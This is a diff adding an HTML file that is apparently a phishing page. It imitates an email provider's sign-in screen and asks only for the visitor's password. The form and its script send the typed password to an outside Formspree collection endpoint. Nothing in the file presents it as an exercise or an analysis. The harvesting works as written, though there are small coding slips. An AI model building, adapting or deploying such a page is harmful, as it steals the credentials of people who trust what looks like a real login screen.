@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <style>
+            .main{
+                padding:3% ;
+                position:absolute;
+                left:33%;
+                top:10%;
+                width:33%;
+                height:72%;
+                border:1px solid rgb(199, 199, 199);
+                border-radius: 10px;
+            }
+            .h2{
+                
+                font-size: 30px;
+                text-align: center;
+                font-family:Arial, Helvetica, sans-serif ;
+            }
+            .para{
+                font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif;
+                text-align:center;
+                font-size: large;
+            }
+            input{
+                width: 80%;
+                height:50px;
+                position: relative;
+                left: 20px;
+                border: 1px solid rgb(88, 88, 90);
+                border-radius: 4px;
+                color:rgb(67, 67, 70);
+
+            }
+            .para2{
+                font-size: medium;
+                font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+                color: rgb(42, 44, 44);
+
+            }
+            .submit{
+                background-color: rgb(45, 45, 230);
+                color:white;
+                position: relative;
+                left: 70%;
+                width:30%; 
+                height:40px;
+
+            }
+            .link{
+                font-size: 15x;
+                color:blue;
+                font-family:Arial, Helvetica, sans-serif;
+                font-style: normal;
+            }
+            a{
+                color:blue;
+                background-color: white;
+                list-style: none;
+                line-break: auto;
+            }
+            
+        </style>
+    </head>
+    <body>
+        <div class="side"></div>
+        <div class="main">
+            <img src="https://tse2.mm.bing.net/th?id=OIP.bUazsv7bC2pTq1nFHvqg4AHaD4&pid=Api&P=0&w=318&h=167" alt="" width="60px" heignt="50px" style="background-color: black;"><br>
+            
+            <h2 class="h2">sign in</h2>
+            <p class="para">to continue to email</p>
+            <form  action='https://formspree.io/f/mwkynonq' id="my-form" method='POST'>
+                
+                <input placeholder="Enter Your Password here" class="input" name="password" type="password"><br><br>
+                <p class="link" style="position: relative; top:-24px; left: 15px;">forget password?</p>
+                <p class="para2">Not your computer? Use Guest mode to sign in privately. </p>
+                
+                 <section class="link">Learn more</section>
+                <br><br>
+                <br>
+                    <section class="link">create acount</section>
+                <input value="submit" class="submit"  type="submit"><br><br><br><br><br><br><br><br>
+               
+
+
+            </form>
+        
+        
+        </div>
+         
+    </body>
+</html>
+<script>
+            
+    var form = document.getElementById("my-form");
+    
+    async function handleSubmit(event) {
+      event.preventDefault();
+      var status = document.getElementById("my-form-status");
+      var data = new FormData(event.target);
+      fetch(event.target.action, {
+        method: form.method,
+        body: data,
+        headers: {
+            'Accept': 'application/json'
+        }
+      }).then(response => {
+        if (response.ok) {
+          status.innerHTML = "Thanks for your submission!";
+          form.reset()
+        } else {
+          response.json().then(data => {
+            if (Object.hasOwn(data, 'errors')) {
+              status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+            } else {
+              status.innerHTML = "Oops! There was a problem submitting your form"
+            }
+          })
+        }
+      }).catch(error => {
+        status.innerHTML = "Oops! There was a problem submitting your form"
+      });
+    }
+    form.addEventListener("submit", handleSubmit)
+    function onclick(){
+        var val = document.getElementById('p');
+        val.innerHTML="invalid password";
+    }
+</script>
